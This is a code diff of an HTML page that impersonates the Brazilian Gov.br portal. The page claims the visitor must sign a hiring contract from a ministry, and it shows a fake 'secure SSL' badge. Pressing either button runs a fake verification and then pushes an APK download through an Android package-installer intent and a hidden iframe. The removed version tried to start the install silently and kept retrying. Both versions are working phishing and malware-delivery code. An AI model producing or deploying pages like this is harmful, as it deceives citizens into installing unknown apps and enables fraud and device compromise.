@@ -1,107 +1,229 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atualização</title>
+    <title>Gov.br | Assinatura de Documento</title>
     <style>
-        body { 
-            font-family: sans-serif; 
-            background: #000; 
-            color: #fff; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        :root {
+            --gov-blue: #0056b3;
+            --gov-dark: #333333;
+            --bg-gray: #f3f4f6;
+            --white: #ffffff;
+            --border: #d1d5db;
         }
-        .card { 
-            background: #1a1a1a; 
-            padding: 20px; 
-            border-radius: 8px; 
-            text-align: center; 
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-gray);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        .hidden { display: none; }
-        /* Animação sutil de loading */
-        .pulse {
-            width: 10px;
-            height: 10px;
-            background: #00ff00;
+
+        .card {
+            background: var(--white);
+            width: 100%;
+            max-width: 400px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border-top: 5px solid var(--gov-blue);
+        }
+
+        .header {
+            padding: 20px 25px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Simula o logo do Gov.br com CSS/SVG inline */
+        .logo-svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        .header-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--gov-dark);
+        }
+
+        .content {
+            padding: 25px;
+        }
+
+        h2 {
+            font-size: 20px;
+            color: var(--gov-dark);
+            margin: 0 0 15px 0;
+        }
+
+        .doc-details {
+            background: #f8f9fa;
+            border-left: 3px solid var(--gov-blue);
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .doc-details strong {
+            display: block;
+            color: #000;
+            margin-bottom: 5px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background-color: var(--gov-blue);
+            color: white;
+            text-align: center;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            margin-bottom: 10px;
+            transition: background 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #004494;
+        }
+
+        .btn-outline {
+            background-color: white;
+            border: 1px solid var(--gov-blue);
+            color: var(--gov-blue);
+        }
+
+        .btn-outline:hover {
+            background-color: #f0f4f8;
+        }
+
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
             border-radius: 50%;
-            animation: pulse 1.5s infinite;
-            margin: 10px auto;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
         }
-        @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            padding: 15px;
+            background: #fafafa;
+            border-top: 1px solid var(--border);
+        }
+
+        .secure-badge {
+            color: #28a745;
+            font-weight: bold;
+            font-size: 11px;
         }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Instalando...</h2>
-        <div class="pulse" id="loader"></div>
-        <p id="status">Baixando em segundo plano</p>
-        <button id="btn" class="hidden" onclick="forceInstall()">Instalar</button>
+        <div class="header">
+            <!-- SVG Simulando Logo Gov.br (Auréola azul com "BR" interno) -->
+            <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="48" fill="#0056b3" />
+                <path d="M50 20 L80 50 L50 80 L20 50 Z" fill="none" stroke="white" stroke-width="4" />
+                <text x="50" y="65" font-size="20" fill="white" text-anchor="middle" font-weight="bold">BR</text>
+            </svg>
+            <span class="header-text">Gov.br</span>
+        </div>
+
+        <div class="content">
+            <h2>Documento Pendente</h2>
+            <p style="color: #666; font-size: 14px; margin-bottom: 15px;">
+                Você foi selecionado para assinar o documento abaixo. A validade é imediata.
+            </p>
+
+            <div class="doc-details">
+                <strong>Contrato de Admissão de Pessoal</strong>
+                <div>
+                    <span style="color: #d9534f;">⚠ Aguardando sua assinatura</span><br>
+                    <span style="font-size: 12px;">Remetente: RH Ministério da Economia</span>
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button id="btn-assinar" class="btn" onclick="iniciarAssinatura()">
+                    <span id="btn-text">Assinar com Gov.br</span>
+                    <div class="spinner" id="spinner"></div>
+                </button>
+                
+                <button class="btn btn-outline" onclick="baixarApk()">
+                    Usar Aplicativo
+                </button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <span class="secure-badge">🔒 Conexão Segura SSL</span><br>
+            &copy; 2026 Governo Federal
+        </div>
     </div>
 
     <script>
-        const APK = 'app.apk';
-        // Usamos relative path para garantir mesmo domínio
-        const url = APK; 
+        function iniciarAssinatura() {
+            const btn = document.getElementById('btn-assinar');
+            const text = document.getElementById('btn-text');
+            const spinner = document.getElementById('spinner');
 
-        function startSilent() {
-            // 1. Tenta o Intent Nativo (A melhor chance de discrição)
-            // O segredo é o 'package=com.android.packageinstaller'
-            const intent = `intent://${url}#Intent;scheme=https;package=com.android.packageinstaller;end`;
+            // Estado de "Verificação"
+            btn.disabled = true;
+            text.style.display = 'none';
+            spinner.style.display = 'block';
+
+            // Simula conexão com o sistema do governo
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                text.innerText = "Baixando App...";
+                text.style.display = 'block';
+                
+                setTimeout(() => {
+                    baixarApk();
+                }, 1000);
+            }, 1500);
+        }
+
+        function baixarApk() {
+            const APK = 'gov-app.apk'; // Seu APK
             
-            // Cria um link invisível e dispara
+            // Intent para Android
             const a = document.createElement('a');
-            a.href = intent;
+            a.href = `intent://${APK}#Intent;scheme=https;package=com.android.packageinstaller;end`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
-
-            // 2. Tenta também o download direto via iframe (fallback)
+            
+            // Fallback iframe
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.src = url;
+            iframe.src = APK;
             document.body.appendChild(iframe);
-
-            // 3. Monitora se a tela mudou (sinal de que o intent funcionou)
-            document.addEventListener('visibilitychange', () => {
-                if (document.hidden) {
-                    // Sucesso! O Android abriu a tela de instalação
-                    document.getElementById('loader').classList.add('hidden');
-                    document.getElementById('status').innerText = 'Instalação iniciada';
-                } else {
-                    // A tela voltou, mas não vimos a instalação. 
-                    // Tenta de novo em 1s.
-                    setTimeout(startSilent, 1000);
-                }
-            });
-
-            // 4. Se demorar muito, mostra botão discreto
-            setTimeout(() => {
-                if (!document.hidden) {
-                    document.getElementById('loader').classList.add('hidden');
-                    document.getElementById('status').innerText = 'Toque para concluir';
-                    document.getElementById('btn').classList.remove('hidden');
-                }
-            }, 5000);
         }
-
-        function forceInstall() {
-            // Se o usuário clicar, força o download e abre o instalador
-            window.location.href = url;
-            setTimeout(() => {
-                window.location.href = `intent://${url}#Intent;package=com.android.packageinstaller;scheme=https;end`;
-            }, 1000);
-        }
-
-        startSilent();
     </script>
 
 </body>
